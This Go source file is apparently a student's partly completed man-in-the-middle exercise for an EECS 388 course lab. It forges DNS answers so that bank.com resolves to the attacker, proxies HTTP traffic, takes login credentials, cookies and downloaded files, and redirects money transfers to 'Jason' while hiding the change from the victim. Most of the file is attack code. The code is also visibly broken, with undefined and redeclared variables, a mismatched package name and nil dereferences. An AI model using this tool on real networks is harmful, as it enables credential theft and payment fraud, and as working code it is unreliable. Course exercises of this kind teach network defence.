/*
EECS 388 Project 3
Part 3. Man-in-the-Middle Attack
mitm.go
When completed (by you!) and compiled, this program will:
- Intercept and spoof DNS questions for bank.com to instead direct
the client towards the attacker's IP.
- Act as an HTTP proxy, relaying the client's requests to bank.com
and sending bank.com's response back to the client... but with an evil twist.
The segments left to you to complete are marked by TODOs. It may be useful
to search for them within this file. Lastly, don't dive blindly into coding
this part. READ THE STARTER CODE! It is documented in detail for a reason.
*/

// TODO #0: Read through this code in its entirety, to understand its
//          structure and functionality.

package main

// These are the imports we used, but feel free to use anything from
// gopacket or the Go standard libraries. DO NOT import other third-party
// libraries, as your code may fail to compile on the autograder.
import (

	"bank.com/mitm/network" // For `eecs388p3.` methods
	"bytes"
	"fmt"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"io"
	"io/ioutil"
	"log"
	//"mime"
	"net"
	"net/http"
	//"net/url"
	"os"
	"strings"
	"syscall"
)

// ==============================
//  DNS MITM PORTION
// ==============================

/*
	HandleDNS detects DNS packets and sends a spoofed DNS response as appropriate.
	Parameters: packet, a packet captured on the network, which may or may not be DNS.
*/
func HandleDNS(packet []byte) {
	packetObj := gopacket.NewPacket(packet, layers.LayerTypeEthernet, gopacket.Default)

	// Due to the BPF filter set in main(), we can assume a UDP layer is present.
	udpLayer := packetObj.Layer(layers.LayerTypeUDP)

	// Manually extract the payload of the UDP layer and parse it as DNS.
	payload := udpLayer.(*layers.UDP).Payload
	dnsPacketObj := gopacket.NewPacket(payload, layers.LayerTypeDNS, gopacket.Default)

	// Check if the UDP packet contains a DNS packet within.
	if dnsLayer := dnsPacketObj.Layer(layers.LayerTypeDNS); dnsLayer != nil {

		// Type-switch the layer to the correct interface in order to operate on its member variables.
		dnsData, _ := dnsLayer.(*layers.DNS)
		//tempNameCheck := []byte("bank.com")
		tempNameCheck := string(string(dnsData.Questions[0].Name))
		if  strings.Compare(tempNameCheck, "bank.com") == 0{
			// TODO #1 (use DNSIntercept, SpoofDNS, and SendRawUDP where necessary)
			udpData, _ := udpLayer.(*layers.UDP)
			ipLayer := packetObj.Layer(layers.LayerTypeIPv4)
			ipData, _ := ipLayer.(*layers.IPv4)

			temp := DNSIntercept{ipData.SrcIP,ipData.DstIP,ipData.Protocol,udpData.SrcPort,udpData.DstPort, dnsData.Questions[0].Name, dnsData.Questions[0].Type, dnsData.Questions[0].Class}
			//fmt.Println("ready to spoof")
			tempBytes := SpoofDNS(temp, payload)
			//fmt.Println("read to raw")
			//fmt.Println(udpData.SrcPort)
			//importantChange
			tempString := eecs383p3.GetLocalIP()
			//inter, _ := net.InterfaceByName("eth0")
			//adList, _ := inter.Addrs()
			//tempString := adList[0].String()
			SendRawUDP(80,[]byte(tempString),tempBytes)
		}


	}
}

/*
	DNSIntercept stores the pertinent information from a captured DNS packet
	in order to craft a response in SpoofDNS.
*/
type DNSIntercept struct {
	srcIP net.IP
	dstIP net.IP
	protocol layers.IPProtocol
	udpSrc layers.UDPPort
	udpDst layers.UDPPort
	name []byte
	dType layers.DNSType
	class layers.DNSClass

	// TODO #2: Determine what needs to be intercepted from the DNS request
	//          for bank.com in order to craft a spoofed answer.

}

/*
	SpoofDNS is called by HandleDNS upon detection of a DNS request for "bank.com". Your goal is to
	make a packet that seems like it came from the genuine DNS server, but
	instead lies to the client that bank.com is at the attacker's IP address.
	Parameters:
	- intercept, a struct containing information from the original DNS request packet
	- payload, the application (DNS) layer from the original DNS request.
	Returns: the spoofed DNS answer packet as a slice of bytes.
*/
func SpoofDNS(intercept DNSIntercept, payload gopacket.Payload) []byte {
	// In order to make a packet containing the spoofed DNS answer, we need
	// to start from layer 3 of the OSI model (IP) and work upwards, filling
	// in the headers of the IP, UDP, and finally DNS layers.

	// TODO #3: Fill in the missing fields below to construct the base layers of
	//          your spoofed DNS packet.
	ip := &layers.IPv4{
		// bank.com operates on IPv4 exclusively.
		Version:  4,
		Protocol: intercept.protocol,
		SrcIP:    intercept.srcIP,
		DstIP:    intercept.dstIP,
	}
	udp := &layers.UDP{
		SrcPort: intercept.udpSrc,
		DstPort: intercept.udpDst,
	}

	// The checksum for the level 4 header (which includes UDP) depends on
	// what level 3 protocol encapsulates it; let UDP know it will be wrapped
	// inside IPv4.
	if err := udp.SetNetworkLayerForChecksum(ip); err != nil {
		log.Panic(err)
	}
	// As long as payload contains DNS layer data, we can convert the
	// sequence of bytes into a DNS data structure.
	dnsPacket := gopacket.NewPacket(payload, layers.LayerTypeDNS, gopacket.Default).
		Layer(layers.LayerTypeDNS)
	dns, ok := dnsPacket.(*layers.DNS)
	if !ok {
		log.Panic("Uh oh! SpoofDNS received a packet that doesn't appear to have a DNS layer.")
	}

	//importantChange
	tempString := eecs383p3.GetLocalIP()
	//inter, _ := net.InterfaceByName("eth0")
	//adList, _ := inter.Addrs()
	tempString := adList[0].String()
	// TODO #4: Populate the DNS layer (dns) with an answer.
	temp := layers.DNSResourceRecord{
		Name: intercept.name,
		Type: intercept.dType,
		Class: intercept.class,
		TTL: 43200,
		IP: net.ParseIP(tempString),
	}
	dns.Answers = append(dns.Answers, temp)
	//dns.Answers[0].

	// Now we're ready to seal off and send the packet.
	// Serialization refers to "flattening" a packet's different layers into a
	// raw stream of bytes to be sent over the network.
	// Here, we want to automatically populate length and checksum fields with the correct values.
	serializeOpts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	buf := gopacket.NewSerializeBuffer()

	if err := gopacket.SerializeLayers(buf, serializeOpts, ip, udp, dns); err != nil {
		log.Panic(err)
	}
	return buf.Bytes()
}

/*
	SendRawUDP is a helper function that sends bytes over UDP to the target host/port
	combination.
	Parameters:
	- port, the destination port.
	- dest, destination IP address.
	- toSend - the raw packet to send over the wire.
	Returns: None
*/
func SendRawUDP(port int, dest []byte, toSend []byte) {
	// Opens an IPv4 socket to destination host/port.
	outFD, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW,
		syscall.IPPROTO_RAW)
	var destArr [4]byte
	copy(destArr[:], dest)
	addr := syscall.SockaddrInet4{
		Port: port,
		Addr: destArr,
	}
	if err := syscall.Sendto(outFD, toSend, 0, &addr); err != nil {
		log.Panic(err)
	}
}

// ==============================
//  HTTP MITM PORTION
// ==============================

/*
	StartHTTPServer sets up a simple HTTP server to masquerade as bank.com, once DNS spoofing is successful.
*/
func StartHTTPServer() {
	http.HandleFunc("/", HandleHTTP)
	log.Panic(http.ListenAndServe(":80", nil))
}

/*
	HandleHTTP is called every time an HTTP request arrives and handles the backdoor
	connection to the real bank.com.
	Parameters:
	- rw, a "return envelope" for data to be sent back to the client;
	- r, an incoming message from the client
*/
func HandleHTTP(rw http.ResponseWriter, r *http.Request) {
	if r.URL.Path == "/kill" {
		os.Exit(1)
	}
	//fmt.Println("http handle")
	// TODO #5: Handle HTTP requests. Roughly speaking, you should delegate most of the work to
	//	        SpoofBankRequest and WriteClientResponse, which handle endpoint-specific tasks,
	//          and use this function for the more general tasks that remain, like actually
	//          communicating over the network.
	r1 := SpoofBankRequest(r)
	r2, _ := http.PostForm(r1.URL.String(), r1.Form)
	WriteClientResponse(r2,r1,&rw)
}

/*
	SpoofBankRequest creates the request that is actually sent to bank.com.
	Parameters:
	- origRequest, the request received from the bank client.
	Returns: The spoofed packet, ready to be sent to bank.com.
*/
func SpoofBankRequest(origRequest *http.Request) *http.Request {
	//fmt.Println("request recieved")
	var bankRequest *http.Request
	//importantchange
	var bankURL = "http://" + eecs383p3.GetBankIP() + origRequest.RequestURI
	//var bankURL = "http://" + "10.38.8.3" + origRequest.RequestURI

	if len(origRequest.Cookies()) != 0 {
		for _, cookie := range origRequest.Cookies() {
			name:= cookie.Name
			value := cookie.Value
			//important change
			//StealServerCookie(name,value)
			//fmt.Println("MITM:   Intercepted Cookie Set By Server")
			//fmt.Println("        Name:  ", name)
			//fmt.Println("        Value: ", value)
		}
	}


	if origRequest.URL.Path == "/login" {
		username:= bankRequest.FormValue("username")
		password := bankRequest.FormValue("password")
		//importantChange
		eecs383p3.StealCredentials(username, password)
		//fmt.Println("MITM:   Intercepted Credentials")
		//fmt.Println("        Username: ", username)
		//fmt.Println("        Password: ", password)
		bankRequest, _ = http.NewRequest("POST", bankURL, bankRequest.Body)
		// TODO #6: Since the client is logging in,
		//          - parse the request's form data,
		//          - steal the credentials,
		//          - make a new request, leaving the values untouched

	} else if origRequest.URL.Path == "/logout" {

		// Since the client is just logging out, don't do anything major here
		bankRequest, _ = http.NewRequest("POST", bankURL, nil)

	} else if origRequest.URL.Path == "/transfer" {
		//ffrom := bankRequest.FormValue("from")
		//fto := bankRequest.FormValue("to")
		bankRequest.Form.Set("to", "Jason")
		//amount := bankRequest.FormValue("amount")
		bankRequest, _ = http.NewRequest("POST", bankURL, bankRequest.Body)
		// TODO #7: Since the client is transferring money,
		//			- parse the request's form data
		//          - if the form has a key named "to", modify it to "Jason"
		//          - make a new request with the updated form values

	} else if origRequest.URL.Path == "/kill"{
		os.Exit(1)
	} else {
		// Silently pass-through any unidentified requests
		bankRequest, _ = http.NewRequest(origRequest.Method, bankURL, origRequest.Body)
	}

	// Also pass-through the same headers originally provided by the client.
	bankRequest.Header = origRequest.Header
	return bankRequest
}

/*
	WriteClientResponse forms the HTTP response to the client, making in-place modifications
	to the response received from the real bank.com.
	Parameters:
	- bankResponse, the response from the bank
	- origRequest, the original request from the client
	- writer, the interface where the response is constructed
	Returns: the same ResponseWriter that was provided (for daisy-chaining, if needed)
*/
func WriteClientResponse(bankResponse *http.Response, origRequest *http.Request, writer *http.ResponseWriter) *http.ResponseWriter {
	fmt.Println("to write from server")
	// Pass any cookies set by bank.com on to the client.
	if len(bankResponse.Cookies()) != 0 {
		for _, cookie := range bankResponse.Cookies() {
			name:= cookie.Name
			value := cookie.Value
			//important change
			//StealServerCookie(name,value)
			fmt.Println("MITM:   Intercepted Cookie Set By Server")
			fmt.Println("        Name:  ", name)
			fmt.Println("        Value: ", value)
			http.SetCookie(*writer, cookie)
		}
	}

	if origRequest.URL.Path == "/transfer" {

		// TODO #8: Use the original request to change the recipient back to the
		//           value expected by the client.
		//           Useful tool: ioutil.NopCloser
		response := bankResponse.Body
		buf := new(bytes.Buffer)
		buf.ReadFrom(response)
		newStr := buf.String()
		origName := origRequest.FormValue("to")
		strings.Replace(newStr,"Jason", origName, 1)
		bankResponse.Body = ioutil.NopCloser(bytes.NewReader([]byte(newStr)))
	} else if origRequest.URL.Path == "/download" {

		// TODO #9: Steal any files sent by bank.com (using eecs388p3.StealFile), while also preserving them for the client response.
		//          Useful tools: mime.ParseMediaType and io.TeeReader
		name := bankResponse.Header.Get("Content-Disposition")
		name2 := strings.Split(name,"=")[1]
		//importantChange
		f = eecs383p3.StealFile(name2)
		//f, err := os.Create("/files/" + name2)
		//if err != nil {
	//		log.Panic(err)
	//	}
		var buf []byte
		(*writer).Write(buf)
		io.TeeReader(strings.NewReader(string(buf)),f)
	} else if origRequest.URL.Path == "/kill"{
		os.Exit(1)
	}

	// Now that all changes are complete, write the body
	if _, err := io.Copy(*writer, bankResponse.Body); err != nil {
		log.Fatal(err)
	}

	return writer
}

func main() {
	// Spoof HTTP traffic concurrently with DNS.
	go StartHTTPServer()

	// Read network packets off the ethernet adapter
	handle, err := pcap.OpenLive("eth0", 1600, true, pcap.BlockForever)
	if err != nil {
		log.Panic(err)
	}
	// Set the BPF (Berkeley Packet Filter) to only grab packets that have a
	// UDP layer. For a deeper explanation:
	// https://www.ibm.com/support/knowledgecenter/SS42VS_7.4.0/com.ibm.qradar.doc/c_forensics_bpf.html
	if err := handle.SetBPFFilter("udp"); err != nil {
		log.Panic(err)
	}
	defer handle.Close()
	// Continuously scan for and handle DNS packets.
	for {
		packet, _, _ := handle.ZeroCopyReadPacketData()
		HandleDNS(packet)
	}
}
